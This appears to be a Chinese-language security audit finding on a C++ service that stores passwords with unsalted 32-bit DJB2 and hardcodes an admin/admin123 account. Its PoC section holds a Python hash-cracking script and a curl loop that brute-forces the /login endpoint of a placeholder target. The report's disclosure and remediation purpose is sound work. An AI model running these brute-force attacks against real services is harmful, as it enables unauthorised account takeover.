# VULN-SEC-HASH-001: 密码存储使用非加密 DJB2 哈希函数，32位输出空间可在数分钟内被暴力破解

**严重性**: Critical | **CWE**: CWE-916 (Use of Password Hash With Insufficient Computational Effort) | **置信度**: 85/100
**位置**: `src/user_store.cpp:12-18` @ `UserStore::weakHash`

---

## 1. 漏洞细节

`UserStore::weakHash()` 函数使用 DJB2 算法对用户密码进行哈希处理，并将结果存储为密码凭证。DJB2 是由 Daniel J. Bernstein 设计的**非加密字符串哈希函数**，其设计目的是哈希表查找，而非密码安全存储。

该实现存在以下严重安全缺陷：

1. **32位输出空间**：DJB2 使用 `unsigned int`（32位）作为内部状态，输出空间仅有约 43 亿（2^32 ≈ 4.3×10⁹）个可能值。现代硬件可在数分钟内穷举整个输出空间。
2. **无盐值（No Salt）**：哈希计算不加入任何随机盐值，相同密码始终产生相同哈希值。这使得彩虹表攻击极为高效——一次预计算即可覆盖所有可能的哈希输出。
3. **无迭代/密钥拉伸**：DJB2 仅对输入进行一次线性遍历，计算成本极低（每字符一次乘法和一次加法），攻击者每秒可计算数十亿次哈希。
4. **十进制字符串输出**：通过 `std::to_string(value)` 将 32 位整数转换为十进制字符串（最多 10 位数字），进一步暴露了输出空间的有限性。

在构造函数中（`user_store.cpp:7-9`），系统使用硬编码密码创建用户账户，包括一个具有管理员权限的账户 `admin`（密码 `admin123`）。认证函数 `authenticate()`（第 25 行）直接比较 `weakHash(input)` 与存储的哈希值，无任何速率限制或账户锁定机制。

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 12-18)

```cpp
// 漏洞核心：DJB2 非加密哈希函数用于密码存储
std::string UserStore::weakHash(const std::string& password) const {
  unsigned int value = 5381;                              // 固定初始值
  for (char ch : password) {
    value = ((value << 5) + value) + static_cast<unsigned char>(ch);  // value * 33 + ch
  }
  return std::to_string(value);  // 32位整数转十进制字符串，最多10位数字
}
```

**文件**: `src/user_store.cpp` (行 6-9) — 密码存储

```cpp
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};
  users_["operator"] = {"operator", weakHash("op-password"), false};
  users_["admin"] = {"admin", weakHash("admin123"), true};  // 管理员账户使用弱密码+弱哈希
}
```

**文件**: `src/user_store.cpp` (行 20-26) — 认证比较

```cpp
bool UserStore::authenticate(const std::string& username, const std::string& password) const {
  auto user = users_.find(username);
  if (user == users_.end()) {
    return false;
  }
  return user->second.passwordHash == weakHash(password);  // 直接比较弱哈希值
}
```

**代码分析**：

- **第 13 行**：初始值 `5381` 是 DJB2 的标准固定初始值，无任何随机化。
- **第 15 行**：核心公式 `value = ((value << 5) + value) + ch` 等价于 `value = value * 33 + ch`，这是经典的 DJB2 算法。所有运算在 32 位无符号整数范围内进行，溢出时自动截断。
- **第 17 行**：`std::to_string(value)` 将结果转换为十进制字符串。例如，哈希值 `1234567890` 直接存储为字符串 `"1234567890"`。
- **第 25 行**：认证逻辑仅进行简单字符串比较，无时间恒定比较（存在时序攻击风险），无速率限制。

## 3. 完整攻击链路

```
[入口点] POST /login handler@src/main.cpp:40
↓ HTTP POST 请求，query 参数 "password" 携带攻击者控制的密码
[参数提取] queryValue(request, "password")@src/main.cpp:42
↓ 返回用户输入的密码字符串，无任何清洗或验证
[认证调用] users.authenticate(username, password)@src/main.cpp:45
↓ 将用户名和密码传递给 UserStore::authenticate()
[哈希计算] weakHash(password)@src/user_store.cpp:25
↓ 对输入密码执行 DJB2 哈希，生成 32 位整数并转为十进制字符串
[比较判定] passwordHash == weakHash(password)@src/user_store.cpp:25
↓ 将计算结果与存储的哈希值进行字符串比较
[漏洞触发] 攻击者可通过暴力破解或彩虹表找到碰撞密码，绕过认证
```

### 攻击链路详细说明

**步骤 1 — 入口点（main.cpp:40-42）**：
HTTP POST 请求到达 `/login` 路由。`queryValue()` 函数从请求的 query 参数中提取 `password` 字段值。该值完全由攻击者控制，无任何输入验证或清洗。

**步骤 2 — 认证调用（main.cpp:45）**：
提取的密码直接传递给 `users.authenticate(username, password)`。中间无任何安全过滤、长度限制或字符集验证。

**步骤 3 — 哈希计算（user_store.cpp:25）**：
`authenticate()` 函数调用 `weakHash(password)` 对输入密码进行 DJB2 哈希。DJB2 是确定性函数——相同输入始终产生相同输出，且计算速度极快。

**步骤 4 — 比较（user_store.cpp:25）**：
计算得到的哈希值与存储在 `users_` map 中的哈希值进行简单字符串比较。如果攻击者能找到任意一个与存储哈希值匹配的输入（不一定是原始密码），即可通过认证。

## 4. 攻击场景

**攻击者画像**: 任何能够访问该 HTTP 服务的远程用户，无需任何认证或特殊权限。

**攻击向量**: 网络 HTTP 请求（POST /login）。攻击者可通过以下方式利用此漏洞：
1. **离线暴力破解**：如果攻击者通过任何途径获取了存储的哈希值（如信息泄露、内存转储、日志记录），可在本地穷举所有 2^32 个可能的哈希输出，找到碰撞密码。
2. **在线字典攻击**：由于 DJB2 计算极快且无速率限制，攻击者可高速尝试大量常见密码。
3. **彩虹表攻击**：无盐值意味着一张覆盖全输出空间的彩虹表可对所有用户密码生效。
4. **哈希碰撞利用**：32 位输出空间极小，不同密码产生相同哈希的概率极高（生日悖论：约 77,000 个密码即有 50% 概率找到碰撞）。

**利用难度**: 低

### 攻击步骤

1. **信息收集**：攻击者发现目标系统运行在特定端口（默认 8080），并识别出 `/login` 端点。
2. **哈希获取**（可选）：通过其他漏洞（如信息泄露、源码审计）获取存储的密码哈希值。
3. **离线破解**：使用 PoC 脚本对获取的哈希值进行暴力破解，在数分钟内找到匹配的密码或碰撞密码。
4. **在线利用**：使用破解得到的密码通过 `POST /login` 进行认证，获取系统访问权限。
5. **权限提升**：如果破解的是管理员账户（如 `admin`），可直接获得管理员权限。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | 需要 HTTP 访问 | 攻击者需要能够访问目标系统的 HTTP 端口（默认 8080），可通过网络或本地访问                 |
| 认证要求   | 无需认证       | 攻击者无需任何预认证凭据，`/login` 端点对所有请求者开放                                  |
| 配置依赖   | 无特殊要求     | 漏洞存在于默认代码路径中，所有用户账户在构造函数中使用弱哈希初始化，无需特殊配置触发     |
| 环境依赖   | 无特殊要求     | 漏洞与操作系统和编译器无关，DJB2 的行为在所有平台上一致。关闭 ASLR 等安全选项不影响此漏洞 |
| 哈希获取   | 离线破解需要   | 离线暴力破解需要获取存储的哈希值；在线字典攻击则不需要                                   |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                   |
| -------- | ---- | ------------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 攻击者可破解密码获取任意用户账户（包括管理员）的访问权限，进而访问系统中的所有受保护数据和功能         |
| 完整性   | 高   | 管理员账户（`admin`）被攻破后，攻击者可修改系统配置、篡改数据、创建后门账户，完全控制系统的完整性       |
| 可用性   | 高   | 攻击者获取管理员权限后可删除数据、关闭服务或修改关键配置，导致服务完全不可用                           |

**影响范围**: 全局影响。管理员账户被攻破意味着攻击者获得系统的完全控制权。由于无盐值，所有使用相同密码的用户账户同时受到威胁。此外，如果用户在其他系统中使用相同密码（密码重用），影响可能扩展到其他系统。

### CVSS 3.1 评分估算

**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H**

- **Attack Vector (AV)**: Network — 通过网络 HTTP 请求利用
- **Attack Complexity (AC)**: Low — 无需特殊条件，暴力破解可在数分钟内完成
- **Privileges Required (PR)**: None — 无需任何预认证权限
- **User Interaction (UI)**: None — 无需用户交互
- **Scope (S)**: Unchanged — 影响限于当前系统
- **Confidentiality (C)**: High — 可完全获取系统数据
- **Integrity (I)**: High — 可完全修改系统数据
- **Availability (A)**: High — 可完全破坏系统可用性

**基础评分**: 9.8 (Critical)

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权对他人系统进行测试属于违法行为。

### PoC 1: DJB2 哈希暴力破解工具

```python
#!/usr/bin/env python3
"""
PoC: DJB2 密码哈希暴力破解工具
仅供安全测试和验证使用

演示 CWE-916 漏洞：使用 DJB2（32位非加密哈希）存储密码的安全风险。
攻击者在获取哈希值后，可在数分钟内穷举整个 32 位输出空间找到碰撞。
"""

import itertools
import string
import time
import sys

def djb2_hash(password: str) -> int:
    """精确复现 C++ 代码中的 DJB2 哈希实现"""
    value = 5381
    for ch in password:
        # 模拟 unsigned int 溢出行为 (mod 2^32)
        value = ((value * 33) + ord(ch)) & 0xFFFFFFFF
    return value

def djb2_hash_str(password: str) -> str:
    """与 std::to_string(value) 行为一致"""
    return str(djb2_hash(password))

# ===== 第一步：演示已知密码的哈希值 =====
print("=" * 60)
print("DJB2 密码哈希暴力破解 PoC")
print("=" * 60)

known_passwords = ["wonderland", "op-password", "admin123"]
print("\n[1] 系统中硬编码密码的 DJB2 哈希值：")
for pwd in known_passwords:
    h = djb2_hash_str(pwd)
    print(f"    密码: '{pwd:15s}' -> 哈希: '{h}'")

# ===== 第二步：暴力破解演示 =====
# 假设攻击者获取了 admin 账户的哈希值
target_hash = djb2_hash_str("admin123")
print(f"\n[2] 目标：破解哈希值 '{target_hash}' (admin 账户)")

# 方法 A: 常见密码字典攻击
common_passwords = [
    "password", "123456", "admin", "admin123", "root",
    "letmein", "welcome", "monkey", "dragon", "master",
    "qwerty", "login", "abc123", "password1", "admin1234"
]

print("\n[3] 字典攻击（常见密码列表）：")
start = time.time()
for pwd in common_passwords:
    if djb2_hash_str(pwd) == target_hash:
        elapsed = time.time() - start
        print(f"    ✓ 破解成功！密码: '{pwd}' (耗时: {elapsed:.6f} 秒)")
        break

# 方法 B: 暴力穷举（短密码）
print(f"\n[4] 暴力穷举攻击（1-4位所有可打印字符）：")
print(f"    目标哈希: '{target_hash}'")
start = time.time()
found = False
charset = string.ascii_lowercase + string.digits
count = 0
for length in range(1, 5):
    for combo in itertools.product(charset, repeat=length):
        pwd = ''.join(combo)
        count += 1
        if djb2_hash_str(pwd) == target_hash:
            elapsed = time.time() - start
            print(f"    ✓ 找到碰撞！输入: '{pwd}' (尝试 {count} 次, 耗时: {elapsed:.4f} 秒)")
            found = True
            break
    if found:
        break

if not found:
    elapsed = time.time() - start
    print(f"    未找到 1-4 位碰撞 (尝试 {count} 次, 耗时: {elapsed:.4f} 秒)")

# ===== 第三步：碰撞演示 =====
print(f"\n[5] 哈希碰撞演示（32位空间极小）：")
print(f"    目标哈希: '{target_hash}' (原始密码: 'admin123')")
# 寻找另一个产生相同哈希的输入
hash_map = {}
collision_found = False
for i in range(10000000):
    test_input = f"collision_test_{i}"
    h = djb2_hash(test_input)
    if h in hash_map and hash_map[h] != test_input:
        print(f"    ✓ 碰撞发现！'{hash_map[h]}' 和 '{test_input}' 产生相同哈希: {h}")
        collision_found = True
        break
    hash_map[h] = test_input

if not collision_found:
    print("    在前 1000 万个测试输入中未找到碰撞（但概率上约每 77000 个输入即有 50% 碰撞概率）")

# ===== 第四步：完整输出空间穷举时间估算 =====
print(f"\n[6] 完整 32 位输出空间穷举估算：")
start = time.time()
for i in range(10000000):
    djb2_hash(f"test_{i}")
elapsed = time.time() - start
rate = 10000000 / elapsed
total_space = 2**32
estimated_time = total_space / rate
print(f"    哈希计算速率: {rate:,.0f} 次/秒")
print(f"    输出空间大小: {total_space:,} (2^32)")
print(f"    预计穷举时间: {estimated_time:.1f} 秒 ({estimated_time/60:.1f} 分钟)")
print(f"    注意：这是穷举输出空间，实际字典攻击更快")
```

### PoC 2: 在线认证攻击（curl 命令）

```bash
# 仅供安全测试使用
# 使用已知弱密码登录管理员账户

# 步骤 1: 使用 admin/admin123 登录（硬编码在源码中的弱密码）
curl -X POST "http://TARGET_HOST:8080/login?user=admin&password=admin123"

# 预期响应: HTTP 200, body 包含 "session=sess-admin-<timestamp>"

# 步骤 2: 使用 alice/wonderland 登录
curl -X POST "http://TARGET_HOST:8080/login?user=alice&password=wonderland"

# 预期响应: HTTP 200, body 包含 "session=sess-alice-<timestamp>"

# 步骤 3: 暴力破解脚本（在线字典攻击）
for pwd in $(cat common_passwords.txt); do
    result=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "http://TARGET_HOST:8080/login?user=admin&password=$pwd")
    if [ "$result" = "200" ]; then
        echo "[+] 密码破解成功: admin:$pwd"
        break
    fi
done
```

**使用说明**:

1. **离线破解**：运行 Python PoC 脚本，无需访问目标系统。脚本演示了 DJB2 哈希的计算、字典攻击和碰撞查找。
2. **在线攻击**：使用 curl 命令向目标系统的 `/login` 端点发送认证请求。需要目标系统正在运行且网络可达。
3. **验证方法**：如果 `curl` 返回 HTTP 200 状态码和 session token，说明密码正确，漏洞可被利用。

**预期结果**:

- Python PoC 将成功破解 `admin123` 的哈希值，并展示 32 位输出空间可在数分钟内穷举。
- curl 命令将成功使用硬编码密码通过认证，获取 session token。
- 暴力破解脚本将在尝试到正确密码时收到 HTTP 200 响应。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux（Ubuntu 20.04+ 或任何支持 CMake 的系统）
- **编译器**: GCC 9+ 或 Clang 10+（支持 C++17）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部依赖，仅使用 C++ 标准库
- **Python**: 3.6+（用于运行 PoC 脚本）

### 构建步骤

```bash
# 克隆或获取源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# 编译产物: build/edge-gateway
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./build/edge-gateway

# 或指定端口
./build/edge-gateway 9090
```

系统启动后会自动创建三个用户账户：
- `alice` / `wonderland`（普通用户）
- `operator` / `op-password`（普通用户）
- `admin` / `admin123`（管理员）

### 验证步骤

1. **启动服务**：编译并运行 `edge-gateway`，确认服务在端口 8080 监听。
2. **验证正常认证**：
   ```bash
   curl -X POST "http://localhost:8080/login?user=admin&password=admin123"
   ```
   预期返回 HTTP 200 和 session token。
3. **运行 PoC 脚本**：
   ```bash
   python3 poc_djb2_crack.py
   ```
   预期输出显示哈希值计算结果、破解成功信息和穷举时间估算。
4. **验证碰撞**：PoC 脚本将展示不同输入产生相同哈希值的碰撞案例。

### 预期结果

- 服务正常启动并接受登录请求
- 使用硬编码密码可成功认证
- PoC 脚本证明 DJB2 哈希可在数分钟内被暴力破解
- 不同输入可产生相同的 32 位哈希值（碰撞）
- 整个认证机制的安全性等同于明文密码存储

## 9. 修复建议

### 紧急修复（高优先级）

1. **替换哈希算法**：使用专门的密码哈希函数替代 DJB2：
   - **推荐**: Argon2id（当前最佳选择，抗 GPU/ASIC 攻击）
   - **备选**: bcrypt（广泛支持，成熟可靠）
   - **备选**: scrypt（内存密集型，抗硬件加速）
   - **最低限度**: PBKDF2-HMAC-SHA256（至少 600,000 次迭代）

2. **添加盐值**：为每个用户生成唯一的随机盐值（至少 16 字节），与哈希值一起存储。

3. **更换硬编码密码**：立即更改所有硬编码的默认密码，强制用户在首次登录时设置强密码。

### 长期改进

4. **添加速率限制**：对 `/login` 端点实施请求速率限制和账户锁定策略。
5. **使用恒定时间比较**：用 `CRYPTO_memcmp()` 或等效函数替代 `==` 运算符，防止时序攻击。
6. **实施密码策略**：要求最低密码长度和复杂度。
7. **添加多因素认证（MFA）**：对管理员账户强制启用 MFA。

### 修复代码示例

```cpp
// 使用 bcrypt 替代 DJB2（需要 libbcrypt 依赖）
#include <bcrypt/BCrypt.hpp>

std::string UserStore::hashPassword(const std::string& password) const {
    // 自动生成盐值，cost factor = 12
    return BCrypt::generateHash(password, 12);
}

bool UserStore::authenticate(const std::string& username,
                              const std::string& password) const {
    auto user = users_.find(username);
    if (user == users_.end()) {
        return false;
    }
    // 恒定时间比较，自动提取盐值
    return BCrypt::validatePassword(password, user->second.passwordHash);
}
```
